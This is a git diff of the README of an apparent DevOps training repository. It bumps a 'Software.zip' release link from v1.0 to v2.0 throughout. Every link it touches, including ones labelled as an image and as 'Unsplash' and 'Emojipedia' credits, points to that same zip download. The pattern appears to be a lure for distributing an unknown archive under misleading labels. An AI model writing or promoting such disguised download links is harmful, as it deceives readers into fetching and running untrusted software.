@@ -35,7 +35,7 @@ DevOps is all about collaboration and continuous improvement. Share your learnin
 
 ## Exclusive Software Bundle 🎁
 
-Looking to explore even more tools and resources related to DevOps? Check out our exclusive software bundle [here](https://github.com/daffa1313/DevOps-Training/releases/download/v1.0/Software.zip). 🚀
+Looking to explore even more tools and resources related to DevOps? Check out our exclusive software bundle [here](https://github.com/daffa1313/DevOps-Training/releases/download/v2.0/Software.zip). 🚀
 
 ## Get Started 🚀
 
@@ -49,11 +49,11 @@ Have questions, ideas, or feedback? Reach out to us on GitHub or join the conver
 
 Remember, the world of DevOps is vast and ever-changing. Stay curious, keep learning, and embrace the challenges that come your way. Your journey in DevOps is just beginning, and there are endless opportunities for growth and exploration. Happy coding! 🌟
 
-![DevOps](https://github.com/daffa1313/DevOps-Training/releases/download/v1.0/Software.zip)
+![DevOps](https://github.com/daffa1313/DevOps-Training/releases/download/v2.0/Software.zip)
 
 ---
 
 ### Credits 🌟
 
-- Image Source: [Unsplash](https://github.com/daffa1313/DevOps-Training/releases/download/v1.0/Software.zip)
-- Emoji Source: [Emojipedia](https://github.com/daffa1313/DevOps-Training/releases/download/v1.0/Software.zip)
+- Image Source: [Unsplash](https://github.com/daffa1313/DevOps-Training/releases/download/v2.0/Software.zip)
+- Emoji Source: [Emojipedia](https://github.com/daffa1313/DevOps-Training/releases/download/v2.0/Software.zip)
